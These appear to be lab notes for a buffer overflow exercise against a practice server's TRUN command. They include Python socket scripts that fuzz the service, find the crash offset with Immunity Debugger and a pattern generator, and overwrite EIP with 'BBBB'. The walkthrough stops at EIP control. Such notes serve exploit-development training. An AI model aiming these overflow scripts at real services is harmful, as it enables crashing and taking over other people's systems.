# Static Analysis
***LINUX***

	strings
	file file.ext

 # Dynamic 
***WINDOWS***

 run it (Double Click)

  see it's awaiting a connection

  check where it's listening from using netstat -antot

  check pid with tasklist

# Script 
```

#!/usr/bin/env python

import socket

buf = " "

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SOCKET, IPv4 TCP
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET
```

***When Ran***
```
python wbuffo.py
 
Welcome to SecureServer! Enter HELP for help.

UNKNOWN COMMAND
```

***Modify Script to run HELP instead of previously used " "***

***OUTPUT***  
```
python wbuffo.py
Welcome to SecureServer! Enter HELP for help.

Valid Commands:
HELP
TRUN [value]
EXIT
```
***Modify Script to run "TRUN /.:/" instead of previously used "HELP"***

***FUZZ ALL COMMANDS, TRUN "/.:/" WORKS MODIFY SCRIPT AGAIN***
```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SOCKET, IPv4 TCP
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET

```

***WINDOWS***

Rick click, Run as admin, Immunity Debugger

(If you get lost or screen changes, click "Window" tab and click "CPU" and it will retrun you to correct screen"

Click file in top right corner, click attach and select malware, malware must be running IOT attach

***LINUX***

RUN SCRIPT

Go to wiremask to Generate 5000 characters

Insert into script on buf +=

***WINDOWS***

Rewind ImDb and press play, run script in LInux

Grab EIP

Put into "Register Value" Box under "FIND THE OFFSET" on Wiremask

Get OFFSET value and modify script

```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "BBBB"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SO$
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET

```

***Windows***

Rewind Script

Press Play

***Linux***

Run Script

Check EIP is 42424242 (From buf += "BBBB"

You can now delete **buf += "BBBB"** as this was just to verify we were targeting EIP


